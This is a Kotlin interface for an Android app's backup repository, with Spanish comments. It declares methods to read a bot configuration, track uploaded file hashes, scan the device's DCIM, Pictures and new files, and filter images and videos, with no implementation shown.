package com.service.assasinscreed02.backup.domain.repositories

import android.content.Context
import com.service.assasinscreed02.backup.domain.entities.BackupConfig
import com.service.assasinscreed02.backup.domain.entities.BackupHistoryEntry
import java.io.File

/**
 * Repositorio para operaciones de backup
 */
interface BackupRepository {
    /**
     * Obtiene la configuración del bot desde SharedPreferences
     */
    suspend fun getBotConfig(context: Context): BackupConfig?
    
    /**
     * Obtiene archivos subidos previamente
     */
    suspend fun getUploadedFiles(context: Context): Set<String>
    
    /**
     * Guarda un archivo como subido
     */
    suspend fun saveUploadedFile(context: Context, fileHash: String)
    
    /**
     * Escanea archivos en DCIM y Pictures
     */
    suspend fun scanDCIMAndPictures(context: Context): List<File>
    
    /**
     * Escanea todos los archivos nuevos del dispositivo
     */
    suspend fun scanAllNewFiles(context: Context): List<File>
    
    /**
     * Filtra archivos por tipo
     */
    suspend fun filterFilesByType(files: List<File>, isImage: Boolean): List<File>
    
    /**
     * Calcula el hash de un archivo
     */
    suspend fun calculateFileHash(file: File): String
    
    /**
     * Verifica si un archivo es una imagen
     */
    fun isImage(file: File): Boolean
    
    /**
     * Verifica si un archivo es un video
     */
    fun isVideo(file: File): Boolean
    
    /**
     * Obtiene tipos de archivo configurados
     */
    suspend fun getConfiguredFileTypes(context: Context): Set<String>
} 